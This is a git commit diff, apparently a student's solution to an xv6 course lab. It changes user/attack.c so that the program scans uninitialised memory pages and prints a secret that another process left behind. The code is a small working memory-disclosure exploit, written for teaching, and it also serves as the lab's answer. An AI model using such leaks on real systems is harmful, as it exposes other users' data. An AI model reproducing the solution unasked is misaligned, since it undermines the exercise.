bb12d0e61c292f9c28ad459480ee11b160fee0c5
Gravifer <44160838+Gravifer@users.noreply.github.com>
2025-12-11 02:11:27 +0800

    feat(syscall): find secret argv[1] in both runs

--- user/attack.c
+++ user/attack.c
@@ -11,14 +11,37 @@ main(int argc, char *argv[])
 {
   // Your code here.
   // explicitly use uninitialized memory
-  // for(int i = 9*4096; i < DATASIZE; i++) {
-  //   // inspect each byte
-  //   if(buf[i] != 0) {
-  //     printf("%d -> 0x%x (%c)\n", i, buf[i], buf[i]);
-  //   }
-  // }
+  int is_string = 0;
+  for (int i = 3*4096; i < 4*4096; i++)
+  {
+    // inspect each byte
+    if(buf[i] != '\0') {
+      // if (!is_string) {
+      //   printf("%s\n", &buf[i]);
+      // }
+      printf("%d -> 0x%x (%c)\n", i, buf[i], buf[i]);
+      is_string = 1;
+    } else {
+      if (is_string) printf("-----------------\n");
+      is_string = 0;
+    }
+  }
+  printf("ans: {\n%s\n}\n", &buf[3*4096 + 16]);
+  printf("=================\n");
+
+  for (int i = 9 * 4096; i < DATASIZE; i++)
+  {
+    // inspect each byte
+    if(buf[i] != '\0') {
+      is_string = 1;
+      printf("%d -> 0x%x (%c)\n", i, buf[i], buf[i]);
+    } else {
+      if (is_string) printf("-----------------\n");
+      is_string = 0;
+    }
+  }
   // printf("Secret data leak: %s\n", &buf[1]);
-  printf("%s\n", &buf[36887]);
+  printf("ans: {\n%s\n}\n", &buf[9*4096 + 23]);
 
   exit(0);
 }
